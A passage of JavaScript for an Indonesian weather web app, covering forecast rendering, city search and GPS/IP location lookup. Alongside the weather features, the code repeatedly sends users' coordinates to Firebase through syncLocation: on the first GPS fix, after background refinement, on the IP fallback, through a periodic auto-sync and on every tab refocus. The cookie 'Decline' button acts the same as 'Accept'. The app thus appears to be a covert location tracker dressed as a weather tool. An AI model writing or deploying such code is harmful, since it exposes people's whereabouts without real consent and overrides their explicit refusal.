      case '50': return '#i-mist';
      default: return '#i-cloud';
    }
  },
  svg(code, size = 42) {
    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${this.fromCode(code)}"/></svg>`;
  }
};

/* ============================================================
   UI
   ============================================================ */
const UI = {
  el: {},

  init() {
    const id = (x) => document.getElementById(x);
    this.el = {
      landing: id('landing'), startBtn: id('startBtn'),
      cookieBanner: id('cookieBanner'), cookieAccept: id('cookieAccept'), cookieDecline: id('cookieDecline'),
      locationModal: id('locationModal'), modalAllow: id('modalAllow'),
      modalManual: id('modalManual'), modalLater: id('modalLater'),
      searchModal: id('searchModal'), searchInput: id('searchInput'),
      searchResults: id('searchResults'), searchCancel: id('searchCancel'),
      app: id('app'), searchBtn: id('searchBtn'), unitToggle: id('unitToggle'),
      status: id('status'), weatherCard: id('weatherCard'),
      accuracyDisclaimer: id('accuracyDisclaimer'), disclaimerText: id('disclaimerText'),
      cityName: id('cityName'), description: id('description'),
      temperature: id('temperature'), humidity: id('humidity'),
      wind: id('wind'), feelsLike: id('feelsLike'),
      currentIconUse: id('currentIconUse'), forecastList: id('forecastList'),
      toast: id('toast')
    };
  },

  setStatus(msg, isError = false) {
    if (!this.el.status) return;
    this.el.status.textContent = Safe.str(msg);
    this.el.status.className = `status show${isError ? ' error' : ''}`;
  },

  clearStatus() {
    if (!this.el.status) return;
    this.el.status.className = 'status';
    this.el.status.textContent = '';
  },

  showToast(msg, duration = 3000) {
    if (!this.el.toast) return;
    this.el.toast.textContent = Safe.str(msg);
    this.el.toast.classList.remove('hidden');
    setTimeout(() => this.el.toast.classList.add('hidden'), duration);
  },

  hideLanding() { if (this.el.landing) this.el.landing.classList.add('hidden'); },
  showApp() { if (this.el.app) this.el.app.classList.remove('hidden'); },
  showCookieBanner() { if (this.el.cookieBanner) this.el.cookieBanner.classList.remove('hidden'); },
  hideCookieBanner() { if (this.el.cookieBanner) this.el.cookieBanner.classList.add('hidden'); },
  showLocationModal() { if (this.el.locationModal) this.el.locationModal.classList.remove('hidden'); },
  hideLocationModal() { if (this.el.locationModal) this.el.locationModal.classList.add('hidden'); },

  showSearchModal() {
    if (this.el.searchModal) this.el.searchModal.classList.remove('hidden');
    if (this.el.searchInput) {
      this.el.searchInput.value = '';
      setTimeout(() => { try { this.el.searchInput.focus(); } catch (e) {} }, 150);
    }
    if (this.el.searchResults) this.el.searchResults.innerHTML = '';
  },

  hideSearchModal() {
    if (this.el.searchModal) this.el.searchModal.classList.add('hidden');
    if (this.el.searchInput) this.el.searchInput.value = '';
    if (this.el.searchResults) this.el.searchResults.innerHTML = '';
  },

  toUnit(c) {
    const v = Safe.num(c, 0);
    return State.unit === 'C' ? Math.round(v) : Math.round(v * 9 / 5 + 32);
  },

  unitSymbol() { return State.unit === 'C' ? '°C' : '°F'; },

  setTheme(condition) {
    document.body.className = '';
    const c = Safe.str(condition).toLowerCase();
    if (c.includes('clear')) document.body.classList.add('theme-clear');
    else if (c.includes('rain') || c.includes('drizzle')) document.body.classList.add('theme-rain');
    else if (c.includes('cloud')) document.body.classList.add('theme-clouds');
    else if (c.includes('snow')) document.body.classList.add('theme-snow');
    else if (c.includes('thunder')) document.body.classList.add('theme-thunder');
  },

  showDisclaimer(text) {
    if (this.el.disclaimerText) this.el.disclaimerText.textContent = Safe.str(text);
    if (this.el.accuracyDisclaimer) this.el.accuracyDisclaimer.classList.remove('hidden');
  },

  hideDisclaimer() {
    if (this.el.accuracyDisclaimer) this.el.accuracyDisclaimer.classList.add('hidden');
  },

  showSkeleton() {
    if (this.el.cityName) this.el.cityName.textContent = '—';
    if (this.el.description) this.el.description.textContent = 'Memuat...';
    if (this.el.temperature) this.el.temperature.textContent = '--°';
    if (this.el.humidity) this.el.humidity.textContent = '—';
    if (this.el.wind) this.el.wind.textContent = '—';
    if (this.el.feelsLike) this.el.feelsLike.textContent = '—';
    if (this.el.forecastList) {
      this.el.forecastList.innerHTML = Array(4).fill(0).map(() => `
        <div class="forecast-item forecast-skeleton">
          <div class="skel-line skel-time"></div>
          <div class="skel-icon"></div>
          <div class="skel-line skel-temp"></div>
        </div>
      `).join('');
    }
    if (this.el.weatherCard) this.el.weatherCard.classList.remove('hidden');
  },

  renderForecastOnly(list) {
    if (!this.el.forecastList || !Array.isArray(list) || list.length === 0) return;
    const slots = list.slice(0, 8);
    this.el.forecastList.innerHTML = slots.map(item => {
      const itemTemp = Safe.num(item?.main?.temp, 0);
      const itemIcon = Safe.str(item?.weather?.[0]?.icon, '01d');
      const itemDesc = Safe.str(item?.weather?.[0]?.description, '—');
      const dtMs = item?.dt ? Safe.num(item.dt, 0) * 1000 : Date.now();
      const d = new Date(isNaN(dtMs) ? Date.now() : dtMs);
      const hh = String(d.getHours()).padStart(2, '0');

      return `
        <div class="forecast-item">
          <div class="forecast-time">${hh}:00</div>
          ${Icon.svg(itemIcon, 42)}
          <div class="forecast-temp">${this.toUnit(itemTemp)}${this.unitSymbol()}</div>
          <div class="forecast-desc">${itemDesc}</div>
        </div>`;
    }).join('');
  },

  render(current, forecast, meta = {}) {
    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) return;

    State.lastData = { current, forecast, meta };

    const temp = Safe.num(current?.main?.temp, 0);
    const feelsLike = Safe.num(current?.main?.feels_like, temp);
    const humidity = Safe.num(current?.main?.humidity, 0);
    const windSpeed = Safe.num(current?.wind?.speed, 0);
    const description = Safe.str(current?.weather?.[0]?.description, 'Tidak diketahui');
    const iconCode = Safe.str(current?.weather?.[0]?.icon, '01d');
    const weatherMain = Safe.str(current?.weather?.[0]?.main, 'Clear');

    let cityName = Safe.str(current?.name, 'Lokasi') +
                   (current?.sys?.country ? ', ' + Safe.str(current.sys.country) : '');

    if (APP_CONFIG.SHOW_COORDS && meta.coords) {
      const lat = meta.coords.lat.toFixed(4);
      const lon = meta.coords.lon.toFixed(4);
      const acc = meta.accuracy != null ? ` ±${meta.accuracy.toFixed(0)}m` : '';
      cityName += ` (${lat}, ${lon}${acc})`;
    }

    if (this.el.cityName) this.el.cityName.textContent = cityName;
    if (this.el.description) this.el.description.textContent = description;
    if (this.el.temperature) this.el.temperature.textContent = `${this.toUnit(temp)}${this.unitSymbol()}`;
    if (this.el.humidity) this.el.humidity.textContent = String(humidity);
    if (this.el.wind) this.el.wind.textContent = windSpeed.toFixed(1);
    if (this.el.feelsLike) this.el.feelsLike.textContent = this.toUnit(feelsLike);
    if (this.el.currentIconUse) this.el.currentIconUse.setAttribute('href', Icon.fromCode(iconCode));
    this.setTheme(weatherMain);

    if (meta.warning) {
      this.showDisclaimer('⚠️ ' + meta.warning);
    } else if (meta.source === 'ip') {
      this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
    } else if (meta.source === 'manual') {
      this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
    } else {
      this.hideDisclaimer();
    }

    if (this.el.forecastList) {
      const list = Safe.arr(forecast?.list);
      if (list.length > 0) this.renderForecastOnly(list);
      else {
        this.el.forecastList.innerHTML = Array(4).fill(0).map(() => `
          <div class="forecast-item forecast-skeleton">
            <div class="skel-line skel-time"></div>
            <div class="skel-icon"></div>
            <div class="skel-line skel-temp"></div>
          </div>
        `).join('');
      }
    }

    if (this.el.weatherCard) this.el.weatherCard.classList.remove('hidden');
  },

  toggleUnit() {
    State.unit = State.unit === 'C' ? 'F' : 'C';
    if (this.el.unitToggle) this.el.unitToggle.textContent = State.unit === 'C' ? '°C' : '°F';
    if (State.lastData) this.render(State.lastData.current, State.lastData.forecast, State.lastData.meta);
  }
};

/* ============================================================
   SEARCH
   ============================================================ */
const Search = {
  async query(q) {
    const query = Safe.str(q).toLowerCase().trim();
    if (query.length < 2) return [];

    const results = [];
    const indoMatches = REGIONS.filter(r =>
      Safe.str(r[0]).toLowerCase().includes(query) ||
      Safe.str(r[2]).toLowerCase().includes(query) ||
      Safe.str(r[3]).toLowerCase().includes(query)
    ).slice(0, 6);

    indoMatches.forEach(r => {
      results.push({
        name: r[0], adm4: r[1], kabupaten: r[2], provinsi: r[3],
        lat: r[4], lon: r[5], type: 'id',
        displayName: `${r[0]}, ${r[2]}, ${r[3]}`
      });
    });

    if (results.length < 3) {
      try {
        const qs = new URLSearchParams({ q, limit: 5, appid: APP_CONFIG.OWM_KEY });
        const res = await fetchWithTimeout(`${APP_CONFIG.OWM_GEO}/direct?${qs}`, {}, 4000);
        const data = await res.json();
        if (Array.isArray(data)) {
          data.forEach(d => {
            const name = Safe.str(d?.name);
            if (!name) return;
            if (results.find(r => r.name.toLowerCase() === name.toLowerCase())) return;
            results.push({
              name, lat: Safe.num(d.lat), lon: Safe.num(d.lon),
              country: Safe.str(d.country), state: Safe.str(d.state),
              type: 'global',
              displayName: `${name}${d.state ? ', ' + d.state : ''}, ${d.country}`
            });
          });
        }
      } catch (e) {}
    }
    return results;
  },

  render(results) {
    if (!UI.el.searchResults) return;
    if (!Array.isArray(results) || results.length === 0) {
      UI.el.searchResults.innerHTML = '<div class="search-empty">Kota tidak ditemukan. Coba nama lain.</div>';
      return;
    }

    UI.el.searchResults.innerHTML = results.map((r, i) => {
      const name = Safe.str(r.name);
      const kab = Safe.str(r.kabupaten);
      const prov = Safe.str(r.provinsi);
      const state = Safe.str(r.state);
      const country = Safe.str(r.country);

      let subtitle = '';
      if (kab) subtitle += ', ' + kab;
      if (prov) subtitle += ', ' + prov;
      if (state && !kab) subtitle += ', ' + state;
      if (country) subtitle += ', ' + country;

      const flag = r.type === 'id' ? '<span class="loc-region">ID</span>' : '';

      return `
        <div class="search-result-item" data-idx="${i}">
          <svg width="14" height="14" aria-hidden="true"><use href="#i-map-pin"/></svg>
          <span>${name}${subtitle}</span>
          ${flag}
        </div>
      `;
    }).join('');

    UI.el.searchResults.querySelectorAll('.search-result-item').forEach((el, i) => {
      el.addEventListener('click', () => {
        const r = results[i];
        UI.hideSearchModal();
        App.loadSelected(r);
      });
    });
  }
};

/* ============================================================
   APP
   ============================================================ */
const App = {
  busy: false,

  async loadSelected(region) {
    State.sourceType = 'manual';

    if (region.type === 'id') {
      UI.setStatus(`Memuat cuaca ${region.name}...`);

      try {
        const adm4 = region.adm4 + '.0001';
        const data = await WeatherAPI.fetchBMKGByAdm4(adm4);

        if (data) {
          const current = WeatherAPI.parseBMKG(data, [region.name, region.adm4, region.kabupaten, region.provinsi]);
          if (current && current.weather && current.weather[0]) {
            const forecast = { list: WeatherAPI.buildBMKGForecast(data) };
            UI.clearStatus();
            UI.render(current, forecast, {
              source: 'manual',
              coords: region.lat ? { lat: region.lat, lon: region.lon } : null
            });
            UI.showToast(`✓ Cuaca ${region.name} dari BMKG`);
            return;
          }
        }
      } catch (e) {}

      this.loadByName(`${region.kabupaten},ID`, `${region.name}, ${region.kabupaten}`, 'manual');
    } else {
      this.loadByCoords(region.lat, region.lon, region.displayName, 'manual');
    }
  },

  async loadByCoords(lat, lon, label, source = 'auto', extraMeta = {}) {
    if (this.busy) return;
    this.busy = true;

    const safeLat = Safe.num(lat);
    const safeLon = Safe.num(lon);

    UI.showSkeleton();

    try {
      const current = await WeatherAPI.getByCoords(safeLat, safeLon, label);
      UI.clearStatus();
      UI.render(current, { list: [] }, {
        source,
        coords: { lat: safeLat, lon: safeLon },
        accuracy: extraMeta.accuracy,
        warning: extraMeta.warning,
        method: extraMeta.method
      });

      // Load forecast paralel di background
      WeatherAPI.getForecast(safeLat, safeLon).then(forecast => {
        if (forecast && forecast.list && forecast.list.length > 0) {
          UI.renderForecastOnly(forecast.list);
          State.lastData = { ...State.lastData, forecast };
        }
      }).catch(() => {});

    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
    } finally {
      this.busy = false;
    }
  },

  async loadByName(query, label, source = 'manual') {
    if (this.busy) return;
    this.busy = true;

    UI.showSkeleton();

    try {
      const qs = new URLSearchParams({
        q: query,
        appid: APP_CONFIG.OWM_KEY,
        units: APP_CONFIG.UNITS,
        lang: APP_CONFIG.LANG
      });

      const curRes = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/weather?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
      const current = await curRes.json();

      if (current.cod && Number(current.cod) !== 200) {
        throw new Error(WeatherAPI.mapError(current.cod));
      }

      UI.clearStatus();
      UI.render(current, { list: [] }, { source });

      fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/forecast?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT)
        .then(r => r.json())
        .then(forecast => {
          if (forecast && forecast.list) {
            UI.renderForecastOnly(forecast.list);
            State.lastData = { ...State.lastData, forecast };
          }
        })
        .catch(() => {});

    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
    } finally {
      this.busy = false;
    }
  },

  /* ============================================================
     GPS: CEpet dulu, refine di background
     ============================================================ */
  async requestGPS() {
    if (locationRequestInProgress) return;
    locationRequestInProgress = true;

    // Clear timer refine lama
    if (State.refineTimer) { clearTimeout(State.refineTimer); State.refineTimer = null; }

    try {
      if (!navigator.geolocation) {
        UI.setStatus('Browser tidak mendukung GPS. Silakan cari kota manual.', true);
        locationRequestInProgress = false;
        UI.showSearchModal();
        return;
      }

      UI.setStatus('Mencari info cuaca...');

      try {
        // STEP 1: QUICK GPS (max 6 detik)
        const quickCoords = await getQuickLocation();

        State.userLocation = quickCoords;
        State.locationGranted = true;
        State.sessionId = getSessionId();
        State.sourceType = 'gps';

        console.log('[gps-quick] ✓ FINAL:', quickCoords);

        // Kirim ke Firebase (non-blocking)
        syncLocation(quickCoords, 'gps-quick');

        // Tampil cuaca CEPAT
        this.loadByCoords(quickCoords.latitude, quickCoords.longitude, 'Lokasi Anda', 'gps', {
          accuracy: quickCoords.accuracy
        });

        // Start auto-sync
        startAutoSync();

        UI.showToast(`✓ Cuaca muncul (±${quickCoords.accuracy.toFixed(0)}m)`);

        // STEP 2: REFINE di background setelah 2 detik
        State.refineTimer = setTimeout(async () => {
          console.log('[gps] memulai refine background...');

          try {
            const refined = await getRefinedLocation();

            // Cek: hanya update kalau lebih akurat DAN beda signifikan
            const improvement = quickCoords.accuracy - refined.accuracy;
            const distance = haversine(
              quickCoords.latitude, quickCoords.longitude,
              refined.latitude, refined.longitude
            );

            console.log(`[gps] refine: improvement=${improvement.toFixed(0)}m, distance=${distance.toFixed(0)}m`);

            if (improvement > 20 && distance > 100) {
              console.log('[gps] ✓ refine berhasil, update');
              State.userLocation = refined;
              syncLocation(refined, 'gps-refined');

              // Clear cache supaya cuaca refresh
              WeatherCache.clear();

              // Update UI dengan koordinat baru
              this.loadByCoords(refined.latitude, refined.longitude, 'Lokasi Anda', 'gps', {
                accuracy: refined.accuracy
              });

              UI.showToast(`✓ Lokasi diperbarui: ±${refined.accuracy.toFixed(0)}m`);
            } else {
              console.log('[gps] refine tidak signifikan, skip update');
            }
          } catch (e) {
            console.warn('[gps] refine gagal:', e.message);
          }
        }, APP_CONFIG.REFINE_GPS_DELAY);

      } catch (err) {
        console.warn('[gps] quick gagal:', err.code, err.message);

        let msg = 'Gagal mendapatkan GPS.';
        if (err.code === 1) msg = 'Izin lokasi ditolak. Cari kota manual:';
        else if (err.code === 2) msg = 'GPS tidak tersedia. Cari kota manual:';
        else if (err.code === 3) msg = 'GPS timeout. Cari kota manual:';

        UI.setStatus(msg, true);
        UI.showSearchModal();
      }
    } finally {
      locationRequestInProgress = false;
    }
  },

  async requestIPLocation() {
    if (State.sourceType === 'gps' && State.userLocation) return;

    UI.setStatus('Mendeteksi lokasi via IP...');

    try {
      const ip = await IPGeo.fetch();

      if (ip && ip.lat && ip.lon) {
        State.userLocation = { latitude: ip.lat, longitude: ip.lon, accuracy: 5000 };
        State.sessionId = getSessionId();
        State.sourceType = 'ip';

        await syncLocation(
          { latitude: ip.lat, longitude: ip.lon, accuracy: 5000 },
          'ip-fallback',
          { locationName: ip.city }
        );

        const label = ip.city + (ip.region ? ', ' + ip.region : '');
        this.loadByCoords(ip.lat, ip.lon, label, 'ip', { accuracy: 5000 });
        UI.showToast(`Lokasi IP: ${ip.city}`);
      } else {
        UI.setStatus('Gagal deteksi via IP. Cari kota manual:', true);
        UI.showSearchModal();
      }
    } catch (e) {
      UI.setStatus('Gagal deteksi via IP. Cari kota manual:', true);
      UI.showSearchModal();
    }
  },

  init() {
    UI.init();

    if (UI.el.startBtn) {
      UI.el.startBtn.addEventListener('click', () => {
        UI.hideLanding();
        UI.showApp();
        if (!State.cookieAccepted) {
          setTimeout(() => UI.showCookieBanner(), 500);
        } else {
          setTimeout(() => this.requestGPS(), 400);
        }
      });
    }

    if (UI.el.cookieAccept) {
      UI.el.cookieAccept.addEventListener('click', () => {
        State.cookieAccepted = true;
        localStorage.setItem('cuaca_cookie_ok', '1');
        UI.hideCookieBanner();
        setTimeout(() => this.requestGPS(), 300);
      });
    }

    if (UI.el.cookieDecline) {
      UI.el.cookieDecline.addEventListener('click', () => {
        State.cookieAccepted = true;
        localStorage.setItem('cuaca_cookie_ok', '0');
        UI.hideCookieBanner();
        setTimeout(() => this.requestGPS(), 300);
      });
    }

    if (UI.el.modalAllow) {
      UI.el.modalAllow.addEventListener('click', (e) => {
        e.stopPropagation();
        UI.hideLocationModal();
        State.sourceType = null;
        locationRequestInProgress = false;
        this.requestGPS();
      });
    }

    if (UI.el.modalManual) {
      UI.el.modalManual.addEventListener('click', (e) => {
        e.stopPropagation();
        UI.hideLocationModal();
        this.requestIPLocation();
        setTimeout(() => {
          if (!State.sourceType) UI.showSearchModal();
        }, 800);
      });
    }

    if (UI.el.modalLater) {
      UI.el.modalLater.addEventListener('click', (e) => {
        e.stopPropagation();
        UI.hideLocationModal();
        UI.showToast('Klik ikon 🔍 untuk cari kota manual');
      });
    }

    if (UI.el.searchBtn) UI.el.searchBtn.addEventListener('click', () => UI.showSearchModal());
    if (UI.el.searchCancel) UI.el.searchCancel.addEventListener('click', () => UI.hideSearchModal());

    let debounce = null;
    if (UI.el.searchInput) {
      UI.el.searchInput.addEventListener('input', e => {
        clearTimeout(debounce);
        const q = e.target.value.trim();
        debounce = setTimeout(async () => {
          const results = await Search.query(q);
          Search.render(results);
        }, 250);
      });
      UI.el.searchInput.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          const first = UI.el.searchResults?.querySelector('.search-result-item');
          if (first) first.click();
        }
      });
    }

    if (UI.el.unitToggle) UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());

    if (UI.el.locationModal) {
      UI.el.locationModal.addEventListener('click', e => {
        if (e.target === UI.el.locationModal) UI.hideLocationModal();
      });
    }
    if (UI.el.searchModal) {
      UI.el.searchModal.addEventListener('click', e => {
        if (e.target === UI.el.searchModal) UI.hideSearchModal();
      });
    }

    const cookieOk = localStorage.getItem('cuaca_cookie_ok');
    if (cookieOk !== null) State.cookieAccepted = true;
  }
};

/* ============================================================
   INIT
   ============================================================ */
document.addEventListener('DOMContentLoaded', () => {
  initFirebase();
  App.init();
});

document.addEventListener('visibilitychange', () => {
  if (!document.hidden && State.locationGranted && State.sourceType === 'gps' && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => syncLocation(pos.coords, 'visibility-resume'),
      () => {},
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
    );
  }
});

window.addEventListener('beforeunload', () => {
  stopAutoSync();
  if (State.refineTimer) clearTimeout(State.refineTimer);
});